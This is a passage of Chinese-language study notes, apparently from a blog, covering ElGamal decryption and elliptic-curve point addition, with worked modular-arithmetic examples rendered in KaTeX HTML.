style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">a</span></span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord mathdefault">p</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">3</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">5</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">5</span><span class="mord mtight">8</span></span></span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord">9</span><span class="mord">7</span><span class="mclose">)</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>5</mn><msup><mn>0</mn><mn>58</mn></msup><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mn>97</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">50^{58}(mod\ 97)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord">5</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">5</span><span class="mord mtight">8</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord">9</span><span class="mord">7</span><span class="mclose">)</span></span></span></span>认真算一下，发现4次方是-1,之后的八次方，十六次方，以及三十二次方都是1，故最后的结果是75。</p><p>75的逆为22，故<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>m</mi><mo>=</mo><mn>31</mn><mo>∗</mo><mn>22</mn><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mn>97</mn><mo stretchy="false">)</mo><mo>=</mo><mn>3</mn></mrow><annotation encoding="application/x-tex">m=31*22(mod\ 97)=3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">3</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">2</span><span class="mord">2</span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord">9</span><span class="mord">7</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">3</span></span></span></span>。成功解密得到了明文。</p></li></ol><p><img src="https://upyun.wuuconix.link/image-20211017223536351.png" alt="Elgmal example" /></p><h2 id="elliptic-curve-2"><a class="markdownIt-Anchor" href="#elliptic-curve-2"></a> Elliptic Curve</h2><p>椭圆曲线密码与Elgmal极为类似，可以对照记忆。</p><h3 id="椭圆曲线定义-2"><a class="markdownIt-Anchor" href="#椭圆曲线定义-2"></a> 椭圆曲线定义</h3><p>椭圆曲线是满足<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>y</mi><mn>2</mn></msup><mo>=</mo><msup><mi>x</mi><mn>3</mn></msup><mo>+</mo><mi>a</mi><mi>x</mi><mo>+</mo><mi>b</mi><mtext>   </mtext><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo>∈</mo><mi>R</mi></mrow><annotation encoding="application/x-tex">y^2=x^3+ax+b \ \ \ a,b\in R</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.008548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">a</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">b</span><span class="mspace"> </span><span class="mspace"> </span><span class="mspace"> </span><span class="mord mathdefault">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">b</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span></span></span></span>的所有解<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo><mo>∈</mo><mi>R</mi><mo>×</mo><mi>R</mi></mrow><annotation encoding="application/x-tex">(x,y)\in R\times R</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span></span></span></span>，加上一个无穷远点O。</p><h3 id="椭圆曲线上的加法-2"><a class="markdownIt-Anchor" href="#椭圆曲线上的加法-2"></a> 椭圆曲线上的加法</h3><p>这个椭圆曲线上的加法十分重要，必须要背出来，之后的加密需要用到。</p><p><img src="https://upyun.wuuconix.link/image-20211017223504313.png" alt="ecc add" /></p><p><img src="https://upyun.wuuconix.link/image-20211017223620429.png" alt="ecc add 2" /></p><p>当两个点关于x轴对称的话，那么他们相加为O。一个点加上一个O，还是本身。</p><p>如果那么普通的两个点P(<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>x</mi><mi>P</mi></msub><mo separator="true">,</mo><msub><mi>y</mi><mi>P</mi></msub></mrow><annotation encoding="application/x-tex">x_P,y_P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">P</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">P</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>)与Q(<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>x</mi><mi>Q</mi></msub><mo separator="true">,</mo><msub><mi>y</mi><mi>Q</mi></msub></mrow><annotation encoding="application/x-tex">x_Q,y_Q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.716668em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.328331em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">Q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.328331em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">Q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>)，假设它们相加为R点（<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>x</mi><mi>R</mi></msub><mo separator="true">,</mo><msub><mi>y</mi><mi>R</mi></msub></mrow><annotation encoding="application/x-tex">x_R,y_R</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>）的话。</p><p>我们首先需要算一个神秘的值<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>α</mi></mrow><annotation encoding="application/x-tex">\alpha</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.0037em;">α</span></span></span></span>。这个<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>α</mi></mrow><annotation encoding="application/x-tex">\alpha</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.0037em;">α</span></span></span></span>需要分两种情况讨论。如果<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>Q</mi></mrow><annotation encoding="application/x-tex">Q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">Q</span></span></span></span>不是同一个点，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>α</mi></mrow><annotation encoding="application/x-tex">\alpha</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.0037em;">α</span></span></span></span>就是就是两点的斜率。如果P和Q是同一个点，那么这时<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>α</mi><mo>=</mo><mo stretchy="false">(</mo><mn>3</mn><msup><mi>x</mi><mn>2</mn></msup><mo>+</mo><mi>a</mi><mo stretchy="false">)</mo><mi mathvariant="normal">/</mi><mn>2</mn><mi>y</mi></mrow><annotation encoding="application/x-tex">\alpha = (3x^2+a)/2y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">3</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">a</span><span class="mclose">)</span><span class="mord">/</span><span class="mord">2</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span></span></span>，这里实际上不用区分<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>x</mi><mi>R</mi></msub></mrow><annotation encoding="application/x-tex">x_R</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>还是<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>x</mi><mi>P</mi></msub></mrow><annotation encoding="application/x-tex">x_P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">P</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>了，因为两者的坐标相同。</p><p>然后<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>x</mi><mi>R</mi></msub><mo>=</mo><msup><mi>α</mi><mn>2</mn></msup><mo>−</mo><msub><mi>x</mi><mi>P</mi></msub><mo>−</mo><msub><mi>x</mi><mi>Q</mi></msub><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">x_R=\alpha^2-x_P-x_Q\ mod\ p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">P</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.980548em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.328331em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">Q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord mathdefault">p</span></span></span></span>。</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>y</mi><mi>R</mi></msub><mo>=</mo><mi>α</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mi>P</mi></msub><mo>−</mo><msub><mi>x</mi><mi>R</mi></msub><mo stretchy="false">)</mo><mo>−</mo><msub><mi>y</mi><mi>P</mi></msub><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">y_R=\alpha(x_P-x_R)-y_P\ mod\ p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">P</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">P</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord mathdefault">p</span></span></span></span></p><p>没什么好记忆的法子，考试前多背几遍。</p><h3 id="椭圆曲线上加法例子-2"><a class="markdownIt-Anchor" href="#椭圆曲线上加法例子-2"></a> 椭圆曲线上加法例子</h3><p><img src="https://upyun.wuuconix.link/image-20211017224713325.png" alt="ecc add example" /></p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>α</mi><mo>=</mo><mo stretchy="false">(</mo><mn>3</mn><mo>∗</mo><mn>1</mn><mo>+</mo><mn>4</mn><mi mathvariant="normal">）</mi><mi mathvariant="normal">/</mi><mn>6</mn><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mn>2773</mn></mrow><annotation encoding="application/x-tex">\alpha = (3 * 1 + 4 ）/ 6\ mod\ 2773</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">3</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">4</span><span class="mord cjk_fallback">）</span><span class="mord">/</span><span class="mord">6</span><span class="mspace"> </span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace"> </span><span class="mord">2</span><span class="mord">7</span><span class="mord">7</span><span class="mord">3</span></span></span></span>。</p><p>这里我们可以发现式子里的除法不是真的除，而是要转化为乘它的逆。</p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>2773</mn><mo>=</mo><mn>462</mn><mo>∗</mo><mn>6</mn><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">2773=462*6+1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">7</span><span class="mord">7</span><span class="mord">3</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">4</span><span class="mord">6</span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">6</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1</mn><mo>=</mo><mn>2773</mn><mo>−</mo><mn>462</mn><mo>∗</mo><mn>6</mn></mrow><annotation encoding="application/x-tex">1 = 2773-462*6</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" 